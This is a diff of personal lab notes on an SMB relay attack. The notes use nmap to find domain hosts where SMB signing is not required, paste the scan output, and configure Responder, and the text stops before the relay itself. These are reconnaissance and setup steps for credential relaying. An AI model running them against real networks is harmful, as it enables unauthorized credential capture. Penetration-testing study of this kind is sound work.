@@ -3,14 +3,14 @@
 ## SMB Relay Attacks Lab
 
 1. Identify the host without SMB signing enabled
-Command: `nmap script=smb2-security-mode.nse -p445 192.168.64.220 -Pn`
+Command: `nmap script=smb2-security-mode.nse -p445 192.168.64.0/24 -Pn | grep not`
 
 `-Pn` - Treats all hosts as online, skipping host discovery. This is useful if you know the host is up but it isn't responding to ICMP echo requests (ping).
 
 
 Here is the result
 
-- For the domain controller
+- For the domain controller, we cannot take advantage and use the SMb relay attack because **Message signing is enabled and required** 
 
 ```
 ┌──(root㉿kali)-[~]
@@ -31,3 +31,56 @@ Host script results:
 Nmap done: 1 IP address (1 host up) scanned in 0.21 seconds
 
 ```
+
+- For the two domain computers joined to the Domain controller (192.168.64.220 and 192.168.64.221) an SMb relay attack can be executed because **Message signing is enabled but not required**. Please see below
+
+```
+┌──(root㉿kali)-[~]
+└─# nmap --script=smb2-security-mode.nse -p445 192.168.64.220 -Pn
+Starting Nmap 7.94 ( https://nmap.org ) at 2024-07-14 16:59 PDT
+Nmap scan report for 192.168.64.220
+Host is up (0.0011s latency).
+
+PORT    STATE SERVICE
+445/tcp open  microsoft-ds
+MAC Address: 4E:4F:0D:0B:16:40 (Unknown)
+
+Host script results:
+| smb2-security-mode: 
+|   3:1:1: 
+|_    Message signing enabled but not required
+
+Nmap done: 1 IP address (1 host up) scanned in 0.45 seconds
+
+┌──(root㉿kali)-[~]
+└─# nmap --script=smb2-security-mode.nse -p445 192.168.64.221 -Pn
+Starting Nmap 7.94 ( https://nmap.org ) at 2024-07-14 17:00 PDT
+Nmap scan report for 192.168.64.221
+Host is up (0.0074s latency).
+
+PORT    STATE SERVICE
+445/tcp open  microsoft-ds
+MAC Address: 8E:27:0F:FF:34:D1 (Unknown)
+
+Host script results:
+| smb2-security-mode: 
+|   3:1:1: 
+|_    Message signing enabled but not required
+
+Nmap done: 1 IP address (1 host up) scanned in 0.36 seconds
+ 
+```
+
+
+2. After we identified the targets, put it in text file targets.txt
+
+![[Pasted image 20240714202517.png]]
+
+3. Change the responder configuration file to **SMB=OFF and HTTP=OFF**
+`sudo mousepad /etc/responder/Responder.conf`
+
+![[Pasted image 20240714202746.png]]
+
+Check if they are off by running the command `sudo responder -I eth0 -dwPV`
+
+
